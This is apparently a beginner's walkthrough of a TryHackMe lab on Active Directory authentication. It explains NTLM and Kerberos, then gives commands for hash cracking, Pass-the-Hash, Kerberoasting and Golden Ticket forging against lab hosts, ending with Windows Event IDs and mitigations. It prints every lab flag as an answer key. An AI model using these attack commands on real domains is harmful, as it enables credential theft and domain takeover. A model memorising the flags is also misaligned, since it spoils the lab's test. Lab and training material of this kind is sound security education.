# Introduction to AD Authentication — TryHackMe

[![Target: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![OS: Linux](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white)](#)
[![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](#)
[![Category: Active Directory](https://img.shields.io/badge/Category-Active%20Directory-purple?style=for-the-badge)](#)

---

## Overview

This walkthrough introduces the fundamentals of authentication in **Active Directory (AD)** environments.

The goal is to understand how Windows domain authentication works, how **NTLM** and **Kerberos** differ, how to identify the authentication protocol being used, and how weaknesses in these protocols can be abused.

The walkthrough is written for beginners, so each section explains not only what command to run, but also **why the command is being used** and what to look for in the output.

---

## Learning Objectives

By the end of this walkthrough, you should understand:

- What authentication means in an Active Directory environment
- The difference between authentication and authorisation
- How NTLM authentication works at a high level
- How Kerberos authentication works at a high level
- How to interact with SMB shares
- How to identify common AD authentication weaknesses
- How attacks such as Pass-the-Hash, Kerberoasting, and Golden Tickets work
- Which Windows Event IDs can help detect authentication attacks


# Task 1: Starting the Network

Before beginning the practical tasks, start the TryHackMe network by clicking the green **Start** button below the network diagram.

Give the machines a few moments to fully boot.

## Using the AttackBox

If you are using the TryHackMe AttackBox, it will automatically connect to the lab network.

You can test connectivity to the Domain Controller with:

```bash
ping ROOTDC.THM.LOC
````

 You should also identify your VPN interface and IP address:

```
ip a
```

 or:

```
ifconfig
```

 Look for the `tun0` interface.

 The `tun0` interface is normally used for communication with the TryHackMe VPN network.

---

 ## Using Your Own Linux Machine

 If you are using your own machine, download the OpenVPN configuration file from the **Network Control Panel**.

 It is useful to keep your VPN configuration and related files in a dedicated directory.

 For example:

```
mkdir "Intro to AD Authentication"
cd "Intro to AD Authentication"
```

 Move your downloaded VPN configuration file into this directory.

 Then connect to the VPN:

```
sudo openvpn <VPN_FILE>.ovpn
```

 A successful connection should show that the VPN tunnel has been established.

 You can also verify the connection from the TryHackMe network panel.

 > **Note:** VPN connections can occasionally drop. If this happens, reconnect using the same OpenVPN command.

---

 # Task 2: Understanding Authentication

 Before using any tools, it is important to understand what authentication actually means.

 **Authentication** is the process of proving your identity.

 In simple terms, authentication answers:

 > "Are you really who you claim to be?"

 For example, when you log into a domain-joined Windows computer with a username and password, the domain needs to verify that those credentials belong to you.

---

 ## Authentication Material

 Authentication requires some form of information that can be used to prove an identity.

 Common examples include:

 - **Username and password** — Something you know.
- **Certificates** — Cryptographic credentials issued by a trusted Certificate Authority.
- **Password hashes** — In some authentication mechanisms and attacks, a password hash can be used instead of the plaintext password.

 The important concept is that authentication material is used to prove an identity without necessarily exposing the user's actual password.

---

 ## Authentication vs Authorisation

 Authentication and authorisation are related, but they are not the same thing.

 **Authentication** answers:

 > "Who are you?"

 **Authorisation** answers:

 > "What are you allowed to access?"

 For example:

```
Authentication
      ↓
"You are John."
      ↓
Authorisation
      ↓
"John can access the Finance share."
```

 Authentication happens first. Once your identity has been established, Active Directory can determine what resources you are allowed to access based on things such as group membership and permissions.

 ### Questions

 **Q1: What is the process called that proves your identity?**

 **Answer:** Authentication

 **Q2: What is the process called that determines what you are allowed to access?**

 **Answer:** Authorisation

---

 # Task 3: NTLM Authentication

 ## What is NTLM?

 **NTLM** is a challenge-response authentication protocol originally developed for Windows NT.

 Modern Windows environments prefer **Kerberos**, but NTLM is still encountered in many environments, particularly when Kerberos cannot be used or when legacy systems and applications are involved.

 There are two important versions:

 - **NTLMv1** — Older and significantly weaker.
- **NTLMv2** — Improved security compared with NTLMv1, but still vulnerable to several attacks.

---

 ## How NTLM Authentication Works

 NTLM uses a **challenge-response** mechanism.

 A simplified authentication process looks like this:

```
Client
  |
  |  "I want to access this service"
  v
Server
  |
  |  Challenge
  v
Client
  |
  |  Challenge response
  v
Server
  |
  |  Verify with Domain Controller
  v
Domain Controller
```

 The important point is that the user's plaintext password is not sent across the network.

 The basic process is:

 1. The client requests access to a service.
2. The server sends a random value called a **challenge**.
3. The client uses information derived from the user's password to calculate a response.
4. The response is sent back to the server.
5. The server verifies the response with the Domain Controller.
6. Access is either granted or denied.

---

 ## NTLM Advantages

 NTLM remains useful in some environments because:

 - It does not require Kerberos infrastructure.
- It does not depend on clock synchronisation.
- It can work in Windows workgroup environments.
- It can act as a fallback when Kerberos cannot be used.

---

 ## NTLM Weaknesses

 NTLM has several important security weaknesses:

 - It does not provide strong mutual authentication.
- NTLM authentication can be vulnerable to relay attacks.
- Password hashes can be abused in Pass-the-Hash attacks.
- Older NTLMv1 authentication uses weak cryptography.
- NTLM can be targeted by downgrade attacks.

 These weaknesses are important because they form the foundation for several attacks covered later in this walkthrough.

---

 ## NTLM Authentication With Impacket

 **Impacket** is a collection of Python tools and libraries that implement various Windows and Active Directory protocols.

 You can locate `smbclient.py` with:

```
locate smbclient.py
```

 If it is located under the standard Impacket examples directory, copy it to your current working directory:

```
cp /usr/share/doc/python3-impacket/examples/smbclient.py .
```

 You can then authenticate to the lab SMB server:

```
python3 smbclient.py 'thm.loc/claire:Password123!@192.168.11.51'
```

 Once connected, you can interact with the SMB server.

 First, list the available shares:

```
shares
```

 Select `SHARE1`:

```
use SHARE1
```

 List the files inside the share:

```
ls
```

 You should find:

```
flag1.txt
```

 Download the file:

```
get flag1.txt
```

 Exit the SMB client:

```
exit
```

 Back in your normal Linux terminal, read the downloaded file:

```
cat flag1.txt
```

 The same process will be used throughout the walkthrough when accessing the different shares:

```
shares
use SHARE#
ls
get flag#.txt
exit
```

 ### Questions

 **Q1: In NTLM, does the client authenticate directly to the Domain Controller or to the service it wants to access?**

 **Answer:** Service

 **Q2: What is the name of the random value that the server sends to the client during NTLM authentication?**

 **Answer:** Challenge

 **Q3: What is the value of Flag 1 that you can recover from SHARE1?**

 **Answer:**

```
THM{5cbcc61a-3178-4220-88b4-367c1bbb48e7}
```

---

 # Task 4: Kerberos Authentication

 ## What is Kerberos?

 **Kerberos** is the primary authentication protocol used by modern Windows Active Directory environments.

 Unlike NTLM, Kerberos uses **tickets**.

 Instead of repeatedly sending authentication information to individual services, a user authenticates to the Domain Controller and receives a **Ticket Granting Ticket (TGT)**.

 That TGT can then be used to request tickets for individual services.

---

 ## Important Kerberos Components

 | Component | Description |
| --- | --- |
| KDC | Key Distribution Center responsible for Kerberos authentication |
| AS | Authentication Service that issues TGTs |
| TGS | Ticket Granting Service that issues service tickets |
| TGT | Ticket used to request service tickets |
| Service Ticket | Ticket used to access a specific service |
| SPN | Service Principal Name identifying a service |
| KRBTGT | Special AD account used to protect TGTs |

---

 ## Kerberos Authentication Flow

 A simplified Kerberos authentication process looks like this:

```
User
 |
 | AS-REQ
 v
KDC
 |
 | AS-REP + TGT
 v
User
 |
 | TGS-REQ + TGT
 v
KDC
 |
 | TGS-REP + Service Ticket
 v
User
 |
 | AP-REQ + Service Ticket
 v
Service
```

 ### Step 1: AS-REQ

 The client requests authentication from the KDC.

 ### Step 2: AS-REP

 The KDC verifies the user and returns a **TGT**.

 ### Step 3: TGS-REQ

 The client uses the TGT to request access to a specific service.

 ### Step 4: TGS-REP

 The KDC provides a **Service Ticket** for that service.

 ### Step 5: AP-REQ

 The client presents the Service Ticket to the target service.

 The service verifies the ticket and grants access.

---

 ## Kerberos Credential Cache

 On Linux systems, Kerberos tickets are commonly stored in **credential cache (`ccache`) files**.

 You can view cached tickets using:

```
klist
```

 The `KRB5CCNAME` environment variable specifies which credential cache should be used.

---

 ## Obtaining a Kerberos Ticket

 First, add the target server to `/etc/hosts`:

```
echo "192.168.11.51 SERVER1.thm.loc" | sudo tee -a /etc/hosts
```

 Locate `getTGT.py`:

```
locate getTGT.py
```

 Copy it into your working directory if necessary:

```
cp /usr/share/doc/python3-impacket/examples/getTGT.py .
```

 Request a Kerberos TGT:

```
python3 getTGT.py thm.loc/mary:'SuperLongForKerberos123!' -dc-ip 192.168.11.100
```

 This should create a credential cache file:

```
mary.ccache
```

 Verify that it exists:

```
ls
```

 Set the `KRB5CCNAME` variable:

```
export KRB5CCNAME=mary.ccache
```

 You can now use the Kerberos ticket to authenticate to SMB:

```
python3 smbclient.py thm.loc/mary@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

 Once connected, list the available shares:

```
shares
```

 Select `SHARE2`:

```
use SHARE2
```

 List the contents:

```
ls
```

 Download the flag:

```
get flag2.txt
```

 Exit:

```
exit
```

 Read the flag from your Linux terminal:

```
cat flag2.txt
```

 > **Important:** Kerberos relies heavily on hostnames and SPNs. When using Kerberos authentication, use the hostname (`SERVER1.thm.loc`) rather than the IP address.

 ### Questions

 **Q1: What is the name of the ticket issued by the KDC that allows you to request service tickets?**

 **Answer:** Ticket Granting Ticket

 **Q2: What special account's password hash is used to encrypt all TGTs?**

 **Answer:** `krbtgt`

 **Q3: What environment variable is used to specify the location of a Kerberos credential cache file on Linux?**

 **Answer:** `KRB5CCNAME`

 **Q4: What is the value of Flag 2 that you can recover from SHARE2 using Kerberos authentication?**

 **Answer:**

```
THM{0d3f818a-427a-425c-a451-55e43b83e876}
```

---

 # Task 5: Common Authentication Weaknesses

 Active Directory authentication can be attacked in several ways.

 The attacks covered in this task are:

 - Weak password cracking
- Pass-the-Hash
- Kerberoasting
- Golden Tickets

 Each attack abuses a different weakness in the authentication process.

---

 ## Weak Password Hashing

 Active Directory stores password-derived values rather than plaintext passwords.

 NTLM hashes are particularly attractive to attackers because they are fast to calculate and do not use a unique salt.

 This makes weak passwords vulnerable to offline password cracking.

 Suppose we obtain the following hash:

```
phillip:1106:aad3b435b51404eeaad3b435b51404ee:939B0058BC6DD834ABC4CC08CFEFEA69:::
```

 The NTLM hash is:

```
939B0058BC6DD834ABC4CC08CFEFEA69
```

 Save it to a file:

```
nano hash.txt
```

 Then use Hashcat:

```
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

 View the recovered password:

```
hashcat -m 1000 hash.txt --show
```

 Use the recovered password to authenticate:

```
smbclient.py 'thm.loc/phillip:<RECOVERED_PASSWORD>@192.168.11.51'
```

 List the shares:

```
shares
```

 Select `SHARE3`:

```
use SHARE3
```

 List the files:

```
ls
```

 Download the flag:

```
get flag3.txt
```

 Exit:

```
exit
```

 Read the flag:

```
cat flag3.txt
```

 ### Questions

 **Q1: What is the value of Flag 3 that you can recover from SHARE3 by cracking the hash?**

 **Answer:**

```
THM{0eef8df3-c8ea-41ad-acd7-ae0479b2badf}
```

---

 ## Pass-the-Hash

 **Pass-the-Hash (PtH)** allows an attacker to authenticate using an NTLM hash without knowing the plaintext password.

 Use the supplied hash with Impacket:

```
smbclient.py thm.loc/ben@192.168.11.51 -hashes aad3b435b51404eeaad3b435b51404ee:63CF41DC25C04B8FB79E44B1DEF12C10
```

 Once connected:

```
shares
```

 Select the share:

```
use SHARE4
```

 List its contents:

```
ls
```

 Download the flag:

```
get flag4.txt
```

 Exit:

```
exit
```

 Read the flag:

```
cat flag4.txt
```

 ### Questions

 **Q1: What is the value of Flag 4 that you can recover from SHARE4 by performing a Pass-the-Hash attack?**

 **Answer:**

```
THM{284c6735-b7c1-4221-b072-abf30a54eeda}
```

---

 ## Kerberoasting

 **Kerberoasting** targets service accounts that have registered **Service Principal Names (SPNs)**.

 An authenticated domain user can request service tickets for services. The ticket contains information that can potentially be cracked offline to recover the service account's password.

 Find accounts with SPNs and request their tickets:

```
GetUserSPNs.py thm.loc/claire:'Password123!' -dc-ip 192.168.11.100 -request
```

 Save the resulting Kerberos service ticket to:

```
service_ticket.txt
```

 The ticket will typically begin with:

```
$krb5tgs$23$
```

 Use Hashcat:

```
hashcat -m 13100 service_ticket.txt /usr/share/wordlists/rockyou.txt
```

 Once the password for `svc_printer` has been recovered, authenticate to SMB:

```
smbclient.py 'thm.loc/svc_printer:<RECOVERED_PASSWORD>@192.168.11.51'
```

 List the shares:

```
shares
```

 Select `SHARE5`:

```
use SHARE5
```

 List the files:

```
ls
```

 Download the flag:

```
get flag5.txt
```

 Exit:

```
exit
```

 Read the flag:

```
cat flag5.txt
```

 ### Questions

 **Q1: What is the value of Flag 5 that you can recover from SHARE5 by authenticating using the credentials recovered through the Kerberoast attack?**

 **Answer:**

```
THM{5b57e69d-7089-4282-ba04-c72de9bfdb38}
```

---

 ## Golden Ticket

 A **Golden Ticket** attack abuses the `krbtgt` account.

 The `krbtgt` account is responsible for protecting Kerberos TGTs. If an attacker obtains the `krbtgt` NTLM hash and the domain SID, they can forge Kerberos TGTs.

 Example:

```
ticketer.py -nthash e9a9871b93d7b4d73c91665bd6df6e50 -domain-sid S-1-5-21-990021728-513958382-3715561918 -domain thm.loc Administrator
```

 This creates:

```
Administrator.ccache
```

 Set the credential cache:

```
export KRB5CCNAME=Administrator.ccache
```

 Authenticate using Kerberos:

```
smbclient.py thm.loc/Administrator@SERVER1.thm.loc -k -no-pass -dc-ip 192.168.11.100
```

 List the available shares:

```
shares
```

 Select `SHARE6`:

```
use SHARE6
```

 List the files:

```
ls
```

 Download the flag:

```
get flag6.txt
```

 Exit:

```
exit
```

 Read the flag:

```
cat flag6.txt
```

 ### Questions

 **Q1: What is the value of Flag 6 that you can recover from SHARE6 by creating a Golden Ticket?**

 **Answer:**

```
THM{eac75729-86ea-4bab-98de-1c5ce3552f67}
```

---

 # Task 6: Detecting Authentication Attacks

 Windows records authentication activity in the **Security Event Log**.

 Understanding these events helps defenders identify suspicious authentication activity.

 ## Important Event IDs

 | Event ID | Description |
| --- | --- |
| `4624` | Successful logon |
| `4625` | Failed logon |
| `4768` | Kerberos TGT requested |
| `4769` | Kerberos service ticket requested |
| `4771` | Kerberos pre-authentication failed |

---

 ## Detecting Pass-the-Hash

 Event ID `4624` records successful logons.

 When investigating NTLM authentication, pay attention to:

 - **Authentication Package:** `NTLM`
- **Logon Type:** `3` for a network logon
- **Source Network Address:** May provide useful information depending on the authentication path

 An unexpected NTLM network logon to a high-value system can be suspicious, particularly when associated with privileged accounts.

---

 ## Detecting Kerberoasting

 Event ID `4769` records Kerberos service-ticket requests.

 Kerberoasting can generate unusual patterns such as:

 - A large number of service-ticket requests
- Multiple requests from the same account
- Requests for numerous service accounts
- Use of older encryption types such as RC4 where stronger encryption is normally expected

 Event ID `4771` records failed Kerberos pre-authentication.

 Repeated failures across multiple accounts can also indicate password attacks or attempts to identify accounts configured without Kerberos pre-authentication.

---

 ## Mitigations

 | Attack | Mitigation |
| --- | --- |
| Pass-the-Hash | Protect privileged accounts and reduce NTLM usage |
| NTLM Relay | Enable SMB signing and Extended Protection where appropriate |
| Kerberoasting | Use strong service-account passwords or gMSAs |
| Golden Ticket | Protect the `krbtgt` account and reset it appropriately after compromise |
| Password Spraying | Use strong passwords, lockout controls, and monitor failed logons |

### Questions

 **Q1: Which Event ID is logged when a Kerberos TGT is requested?**

 **Answer:** `4768`

 **Q2: In a Pass-the-Hash attack detected via Event ID 4624, what value appears in the Authentication Package field?**

 **Answer:** `NTLM`

---

 # Task 7: Conclusion

 In this walkthrough, we covered the fundamentals of authentication in Active Directory.

 We learned:

 - The difference between authentication and authorisation
- How NTLM authentication works
- How Kerberos authentication works
- How to interact with SMB shares
- How NTLM hashes can be cracked
- How Pass-the-Hash works
- How Kerberoasting works
- How Golden Tickets work
- Which Windows Event IDs can help detect authentication attacks

 The most important concept to remember is that **authentication is the foundation of Active Directory security**.

 If an attacker can obtain, reuse, or forge authentication material, they may be able to move through the environment and eventually obtain significant privileges.

 Understanding how authentication works makes it much easier to understand both **how AD attacks work** and **how defenders can detect and prevent them**.
